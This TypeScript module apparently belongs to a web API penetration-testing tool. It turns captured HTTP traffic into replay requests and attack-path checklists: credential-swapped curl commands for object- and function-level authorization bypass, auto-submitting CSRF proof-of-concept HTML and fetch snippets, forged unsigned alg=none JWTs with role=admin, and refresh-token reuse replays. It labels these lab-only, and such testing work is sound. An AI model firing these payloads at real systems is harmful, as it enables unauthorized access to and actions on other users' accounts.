import type { ActorId, AttackPath, CapturedRequest, Finding, JwtToken, ReplayItem, Workspace } from "./types.ts";
import { mintJwt } from "./jwt.ts";
import { pathIds } from "./ids.ts";
import { headerValue } from "./cookies.ts";
import { isRefreshRequest } from "./refresh.ts";
import {
  applyCredentialBoundary,
  credentialSetFromBearer,
  extractActorCredentials,
  type ActorCredentialSet,
} from "./replay-credentials.ts";

function sh(s: string): string {
  return `'${s.replace(/'/g, `'\\''`)}'`;
}

const SKIP_HOP = /^(host|content-length|connection|transfer-encoding|accept-encoding)$/i;

export function curlReplay(sample: CapturedRequest, creds?: ActorCredentialSet): string {
  const req = creds ? applyCredentialBoundary(sample, creds).request : sample;
  const parts = ["curl", "-sS", sh(req.url)];
  const method = req.method && req.method !== "GET" ? req.method : "";
  if (method) parts.splice(2, 0, "-X", method);
  for (const h of req.requestHeaders) {
    if (SKIP_HOP.test(h.name)) continue;
    parts.push("-H", sh(`${h.name}: ${h.value}`));
  }
  if (req.requestBody) parts.push("--data-binary", sh(req.requestBody));
  return parts.join(" ");
}

function rawHttpFromSample(sample: CapturedRequest): string {
  let u: URL;
  try {
    u = new URL(sample.url);
  } catch {
    return `${sample.method} ${sample.url}`;
  }
  const lines = [`${sample.method} ${u.pathname}${u.search} HTTP/1.1`, `Host: ${u.host}`];
  for (const h of sample.requestHeaders) {
    if (SKIP_HOP.test(h.name)) continue;
    lines.push(`${h.name}: ${h.value}`);
  }
  if (sample.requestBody) {
    lines.push("", sample.requestBody);
  } else lines.push("", "");
  return lines.join("\n");
}

function toReplay(
  id: string,
  title: string,
  severity: ReplayItem["severity"],
  note: string,
  sample: CapturedRequest,
  creds: ActorCredentialSet,
): ReplayItem {
  const bound = applyCredentialBoundary(sample, creds);
  return {
    id,
    title,
    severity,
    note,
    curl: curlReplay(bound.request),
    raw: rawHttpFromSample(bound.request),
    credentialSource: { actor: bound.sourceActor, kinds: bound.attachedKinds },
    strippedHeaders: bound.strippedNames,
    headerDiff: bound.headerDiff,
  };
}

function urlDecode(s: string): string {
  try {
    return decodeURIComponent(s.replace(/\+/g, " "));
  } catch {
    return s;
  }
}

function htmlAttr(s: string): string {
  return s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
}

/** Cross-site CSRF proof-of-concept for a captured state-changing request. */
export function csrfPoc(sample: CapturedRequest): { html: string; fetch: string; isForm: boolean } {
  const method = sample.method.toUpperCase();
  const ct = headerValue(sample.requestHeaders, "content-type") ?? "";
  const body = sample.requestBody ?? "";
  const isForm =
    method === "GET" || /application\/x-www-form-urlencoded/i.test(ct) || (!/json/i.test(ct) && /^[^={]*=[^&]*/.test(body));
  let inputs = "";
  if (body && isForm) {
    for (const pair of body.split("&")) {
      const eq = pair.indexOf("=");
      const k = eq >= 0 ? pair.slice(0, eq) : pair;
      const v = eq >= 0 ? pair.slice(eq + 1) : "";
      if (!k) continue;
      inputs += `\n    <input type="hidden" name="${htmlAttr(urlDecode(k))}" value="${htmlAttr(urlDecode(v))}">`;
    }
  }
  const html = `<!-- open while logged in on another origin -->
<form action="${htmlAttr(sample.url)}" method="${method === "GET" ? "GET" : "POST"}"${
    isForm && method !== "GET" ? ' enctype="application/x-www-form-urlencoded"' : ""
  }>${inputs}
</form>
<script>document.forms[0].submit()</script>`;
  const fetchBody = body ? `,\n  body: ${JSON.stringify(body)}` : "";
  const fetchSnippet = `// cross-site, victim's cookies ride along
fetch(${JSON.stringify(sample.url)}, {
  method: ${JSON.stringify(method)},
  credentials: "include"${fetchBody}
})`;
  return { html, fetch: fetchSnippet, isForm };
}

function plainReplay(
  id: string,
  title: string,
  severity: ReplayItem["severity"],
  note: string,
  curl: string,
  raw: string,
): ReplayItem {
  return { id, title, severity, note, curl, raw };
}

function parseFp(fp: string | undefined): string[] {
  return (fp ?? "").split(":");
}

/** BFLA: replay the low-privilege actor's exact request to the admin function. */
function bflaReplays(findings: Finding[], requests: CapturedRequest[]): ReplayItem[] {
  const out: ReplayItem[] = [];
  for (const f of findings) {
    if (!(f.fingerprint ?? "").startsWith("bfla:")) continue;
    const [, actor, method, ...rest] = parseFp(f.fingerprint);
    const template = rest.join(":");
    const sample = requests.find(
      (r) => r.actor === actor && r.method === method && r.template === template && r.status >= 200 && r.status < 300,
    );
    if (!sample) continue;
    const creds = extractActorCredentials(requests.filter((r) => r.actor === (actor as ActorId)));
    if (!creds) continue;
    out.push(
      toReplay(
        `replay-bfla-${out.length}`,
        `BFLA · actor ${actor} on ${method} ${template}`,
        f.severity === "critical" ? "high" : f.severity,
        "Only this actor's own credentials attached. If the admin function still succeeds in a lab proxy, function-level authz is missing. ClaimForge does not send it.",
        sample,
        creds,
      ),
    );
  }
  return out;
}

/** CSRF: emit a cross-site proof-of-concept (HTML auto-submit + fetch). */
function csrfReplays(findings: Finding[], requests: CapturedRequest[]): ReplayItem[] {
  const out: ReplayItem[] = [];
  const seen = new Set<string>();
  for (const f of findings) {
    if (!(f.fingerprint ?? "").startsWith("csrf:")) continue;
    const [, method, ...rest] = parseFp(f.fingerprint);
    const template = rest.join(":");
    const key = `${method} ${template}`;
    if (seen.has(key)) continue;
    const sample = requests.find(
      (r) => r.method.toUpperCase() === method && r.template === template && headerValue(r.requestHeaders, "cookie"),
    );
    if (!sample) continue;
    seen.add(key);
    const poc = csrfPoc(sample);
    out.push(
      plainReplay(
        `replay-csrf-${out.length}`,
        `CSRF PoC · ${method} ${template}`,
        f.severity === "critical" ? "high" : f.severity,
        `Cross-site PoC — host on another origin and open it while logged in. If the state change lands, CSRF is real. ${
          poc.isForm ? "Auto-submitting HTML form." : "JSON body needs a simple-request/CORS bypass; use the fetch snippet."
        } Lab only — ClaimForge does not fire it.`,
        poc.fetch,
        poc.isForm ? poc.html : poc.fetch,
      ),
    );
  }
  return out;
}

/** Refresh reuse: replay the refresh call that presented the rotated token. */
function refreshReplays(findings: Finding[], requests: CapturedRequest[]): ReplayItem[] {
  const out: ReplayItem[] = [];
  const seen = new Set<string>();
  for (const f of findings) {
    if (!(f.fingerprint ?? "").startsWith("refresh:")) continue;
    const [, actor] = parseFp(f.fingerprint);
    const sample = requests.find(
      (r) => r.actor === actor && r.template === f.template && isRefreshRequest(r) && r.status >= 200 && r.status < 300,
    );
    if (!sample) continue;
    const key = `${actor}:${sample.template}`;
    if (seen.has(key)) continue;
    seen.add(key);
    out.push(
      plainReplay(
        `replay-refresh-${out.length}`,
        `Refresh replay · actor ${actor} on ${sample.method} ${sample.template}`,
        f.severity === "critical" ? "high" : f.severity,
        "Replay this refresh call with the rotated (old) token well past any grace window. If it still returns 2xx, rotation is not enforced. Lab only.",
        curlReplay(sample),
        rawHttpFromSample(sample),
      ),
    );
  }
  return out;
}

export function buildReplays(
  ws: Pick<Workspace, "requests" | "jwts" | "graph" | "aLabel" | "bLabel" | "findings">,
): ReplayItem[] {
  const out: ReplayItem[] = [];
  const aReqs = ws.requests.filter((r) => r.actor === "A" && r.method !== "PASTE");
  const bReqs = ws.requests.filter((r) => r.actor === "B" && r.method !== "PASTE");
  const bCreds = extractActorCredentials(bReqs);

  const bola = ws.graph.edges.filter((e) => e.bola);
  for (const e of bola) {
    const sample =
      aReqs.find((r) => `${r.method} ${r.path}` === e.via || e.via.endsWith(r.path)) ??
      bReqs.find((r) => `${r.method} ${r.path}` === e.via || e.via.endsWith(r.path));
    if (!sample || !bCreds) continue;
    out.push(
      toReplay(
        `replay-bola-${out.length}`,
        `BOLA · ${ws.bLabel} credentials only on ${e.via}`,
        "critical",
        `Source credentials wiped, then only ${ws.bLabel}'s set attached. Paste into a lab interceptor. ClaimForge does not send it.`,
        sample,
        bCreds,
      ),
    );
  }

  const noneJwt = ws.jwts.find((j) => (j.alg ?? "").toLowerCase() === "none" || j.issues.some((i) => i.includes("none")));
  if (noneJwt) {
    const admin = mintJwt({ alg: "none", typ: "JWT" }, { ...noneJwt.payload, role: "admin", is_admin: true });
    const hostReq = [...aReqs, ...bReqs].find((r) => r.path.includes("/admin") || r.template.includes("/me")) ?? aReqs[0];
    if (hostReq) {
      const forged = {
        ...hostReq,
        method: "GET",
        requestBody: undefined,
      };
      out.push(
        toReplay(
          "replay-none-admin",
          "Unsigned JWT · role=admin (forged locally)",
          "high",
          "Source credentials wiped. Only the locally minted alg=none bearer is attached. Replay only in a lab proxy you control.",
          forged,
          credentialSetFromBearer("forge", admin),
        ),
      );
    }
  }

  const swap = interestingSwap(aReqs, bReqs, bCreds, ws.bLabel);
  if (swap) out.push(swap);

  out.push(...bflaReplays(ws.findings, ws.requests));
  out.push(...csrfReplays(ws.findings, ws.requests));
  out.push(...refreshReplays(ws.findings, ws.requests));

  return dedupeReplays(out);
}

function interestingSwap(
  aReqs: CapturedRequest[],
  bReqs: CapturedRequest[],
  bCreds: ActorCredentialSet | undefined,
  bLabel: string,
): ReplayItem | null {
  if (!bCreds) return null;
  const aObj = aReqs.find((r) => pathIds(r.path).length && r.status >= 200 && r.status < 300 && r.method === "GET");
  if (!aObj) return null;
  const already = bReqs.some((r) => r.path === aObj.path);
  if (already) return null;
  return toReplay(
    "replay-swap-id",
    `Hypothesis · ${aObj.method} ${aObj.path} with ${bLabel} credentials only`,
    "medium",
    "Source credentials wiped. Single-actor credential set. Test in-scope only.",
    aObj,
    bCreds,
  );
}

function dedupeReplays(items: ReplayItem[]): ReplayItem[] {
  const seen = new Set<string>();
  return items.filter((i) => {
    if (seen.has(i.curl)) return false;
    seen.add(i.curl);
    return true;
  });
}

export function buildPaths(ws: {
  findings: Finding[];
  jwts: JwtToken[];
  graph: Workspace["graph"];
  loot: Workspace["loot"];
  aLabel: string;
  bLabel: string;
  diffs: Workspace["diffs"];
}): AttackPath[] {
  const paths: AttackPath[] = [];
  const bolaF = ws.findings.filter((f) => f.confidence === "confirmed" && /BOLA|IDOR/i.test(f.title));
  if (bolaF.length) {
    paths.push({
      id: "path-horizontal",
      title: `Horizontal access · ${ws.bLabel} reads ${ws.aLabel}'s objects`,
      objective: "Reproduce BOLA in a lab proxy with two sessions and one object id. Capture heuristics are not a ship-it report.",
      findingIds: bolaF.map((f) => f.id),
      steps: [
        `Capture login for ${ws.aLabel} and ${ws.bLabel} (two HARs / Burp XML).`,
        "Open ID graph — red edges are foreign object reads (heuristic).",
        `Copy the BOLA curl from Playbook (${ws.bLabel} credentials only + ${ws.aLabel} object URL).`,
        "Replay in your interceptor on the lab. Confirm foreign fields in the body.",
        "File only after the live lab response matches. Missing object-level authorization is the usual fix.",
      ],
    });
  }

  const jwtF = ws.findings.filter((f) => /alg is none|unsigned/i.test(f.why + f.title));
  if (jwtF.length) {
    paths.push({
      id: "path-jwt-none",
      title: "Unsigned JWT · claim tamper",
      objective: "Mint alg=none with elevated role and test admin routes in a lab proxy. Capture alg=none does not prove the API accepts it.",
      findingIds: jwtF.map((f) => f.id),
      steps: [
        "Open Forge, load the unsigned token.",
        "Preset: alg none + role admin.",
        "Copy the minted token. Do not send it from this app.",
        "In your proxy, replace Authorization on /api/admin/* and /api/me.",
        "If admin JSON returns, the API trusts client-signed tokens. If 401, the capture issue did not reproduce.",
      ],
    });
  }

  const mass = ws.loot.filter((l) => l.kind === "mass-assign");
  if (mass.length) {
    paths.push({
      id: "path-mass",
      title: "Mass assignment on write endpoints",
      objective: "Check whether role/price/userId in JSON is honored — the loot row is a hint.",
      findingIds: [],
      steps: [
        "Loot lists write fields: role, admin, price, userId.",
        "In Repeater, flip one field at a time on an in-scope lab.",
        "Compare response to the original capture — did the object change owner or role?",
      ],
    });
  }

  const denied = ws.diffs.filter((d) => d.verdict === "denied");
  if (denied.length) {
    paths.push({
      id: "path-vertical",
      title: "Vertical — admin routes denied for B",
      objective: "403 in this capture is not 403 after claim tamper. Re-test in the lab.",
      findingIds: [],
      steps: [
        ...denied.slice(0, 4).map((d) => `${d.method} ${d.template} denied for B — retry with forged admin JWT in the lab proxy.`),
      ],
    });
  }

  const sessF = ws.findings.filter((f) => /logout/i.test(f.title));
  if (sessF.length) {
    paths.push({
      id: "path-logout",
      title: "Token still valid after logout",
      objective: "Check whether the server revokes the bearer on logout. A later 2xx is a hint, not policy proof outside lab.",
      findingIds: sessF.map((f) => f.id),
      steps: [
        "Capture login, a privileged GET, logout, then the same GET.",
        "If the last GET is 2xx after a 2xx logout, the session may not be on a denylist.",
        "Replay that curl from Playbook on the lab. Do not fire it from this app.",
      ],
    });
  }

  const bflaF = ws.findings.filter((f) => (f.fingerprint ?? "").startsWith("bfla:"));
  if (bflaF.length) {
    paths.push({
      id: "path-bfla",
      title: `Function-level bypass · ${ws.bLabel}-tier actor hits admin functions`,
      objective:
        "Confirm a non-privileged role reaching an administrative function (BFLA). Capture heuristics are not a ship-it report — reproduce in a lab.",
      findingIds: bflaF.map((f) => f.id),
      steps: [
        `Log in as the low-privilege role and capture the admin-function call(s).`,
        "Copy the BFLA curl from the Replay pack (only that actor's credentials attached).",
        "Replay in your interceptor on the lab. A privileged action that succeeds is the bug.",
        "For verb-tampering rows, retry the same path with the alternate method (e.g. POST→PUT).",
        "Fix: enforce role/permission on the function server-side, not just object ownership.",
      ],
    });
  }

  const csrfF = ws.findings.filter((f) => (f.fingerprint ?? "").startsWith("csrf:"));
  if (csrfF.length) {
    paths.push({
      id: "path-csrf",
      title: "CSRF · forge a cross-site state change",
      objective:
        "Cookie auth with no anti-CSRF token is only a candidate — prove it by forging the request from another origin while logged in.",
      findingIds: csrfF.map((f) => f.id),
      steps: [
        "Copy the CSRF PoC from the Replay pack (auto-submit HTML form, or the fetch snippet for JSON bodies).",
        "Host it on a different origin and open it in a browser session that is logged into the lab app.",
        "If the state change lands without a token, CSRF is real. JSON bodies also need a simple-request/CORS bypass.",
        "Fix: per-session anti-CSRF token, or SameSite=Lax/Strict plus a validated custom header.",
      ],
    });
  }

  const refreshF = ws.findings.filter((f) => (f.fingerprint ?? "").startsWith("refresh:"));
  if (refreshF.length) {
    paths.push({
      id: "path-refresh",
      title: "Refresh-token rotation abuse",
      objective:
        "A rotated refresh token accepted again may mean rotation is not enforced — but a short reuse/leeway window is legitimate (RFC 9700).",
      findingIds: refreshF.map((f) => f.id),
      steps: [
        "Capture a full refresh: present token T, receive a new token T'.",
        "Copy the Refresh replay from the Replay pack.",
        "Replay T well past any grace window (seconds to minutes later, or after a second rotation).",
        "If T still returns 2xx, rotation is broken. On true reuse, the server should revoke the whole token family.",
      ],
    });
  }

  if (!paths.length) {
    paths.push({
      id: "path-recon",
      title: "Recon from capture",
      objective: "Two-role coverage of every template that returns an object id.",
      findingIds: [],
      steps: [
        "Loot → wordlist of ids/emails. Feed your fuzzer in the lab, not from here.",
        "Hit each Diff row as both actors.",
        "Re-import the new HARs and re-run the graph.",
      ],
    });
  }
  return paths;
}
